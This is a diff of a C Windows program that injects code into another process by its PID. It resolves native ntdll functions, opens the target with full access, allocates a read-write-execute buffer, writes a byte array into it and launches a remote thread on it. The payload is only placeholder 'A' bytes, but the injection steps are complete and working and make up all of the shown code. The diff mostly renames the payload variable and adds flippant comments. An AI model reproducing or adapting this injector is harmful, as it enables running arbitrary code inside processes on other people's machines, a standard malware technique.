@@ -32,27 +32,27 @@ int main(int argc, char* argv[]) {
   HANDLE  hThread = NULL;
   HANDLE  hProcess= NULL;
 
-  const UCHAR aids[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
-  SIZE_T szAids = sizeof(aids);
+  const UCHAR pkg[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
+  SIZE_T szPkg = sizeof(pkg); // We'll need this later.
 
-  if(argc < 2) {
+  if(argc < 2) { // No arguments
     warn("usage: %s <PID>", argv[0]);
     return -1;
   }
 
   PID = atoi(argv[1]);
-  hNTDLL = GetMod(L"NTDLL");
+  hNTDLL = GetMod(L"NTDLL"); // Get a handle to ntdll so we can use it
 
   OBJECT_ATTRIBUTES OA = {sizeof(OA), NULL};
   CLIENT_ID CID = {(HANDLE)PID, NULL};
 
-  info("Populating NT Functions...");
+  info("Populating NT Functions..."); // Populate all of the functions we're going to be usingggggg
   NtOpenProcess spyOpen = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
   NtCreateThreadEx spyThread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
   NtAllocateVirtualMemoryEx spyVirtualAlloc = (NtAllocateVirtualMemoryEx)GetProcAddress(hNTDLL, "NtAllocateVirtualMemoryEx");
   NtWriteVirtualMemory spyVirtualWrite = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
   NtClose spyClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
-  okay("Complete, beginning injection.");
+  okay("Complete, beginning injection."); // TIME FOR FUN
 
   /*-------- BEGIN INJECTION --------*/
   STATUS = spyOpen(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
@@ -64,7 +64,7 @@ int main(int argc, char* argv[]) {
   info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);
 
   info("Allocating [RWX] buffer in process memory...");
-  rBuffer = spyVirtualAlloc(hProcess, NULL, szAids, (MEM_RESERVE | MEM_COMMIT),
+  rBuffer = spyVirtualAlloc(hProcess, NULL, szPkg, (MEM_RESERVE | MEM_COMMIT),
     PAGE_EXECUTE_READWRITE, NULL, NULL);
   if (rBuffer == NULL) {
     warn("[VirtualAllocEx] failed, error: 0x%lx", GetLastError());
@@ -73,7 +73,7 @@ int main(int argc, char* argv[]) {
   okay("Allocated [RWX] buffer in process memory at 0x%p", rBuffer);
 
   info("Writing to allocated buffer...");
-  spyVirtualWrite(hProcess, rBuffer, aids, szAids, 0);
+  spyVirtualWrite(hProcess, rBuffer, pkg, szPkg, 0);
 
   STATUS = spyThread(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
   if (STATUS != STATUS_SUCCESS) {
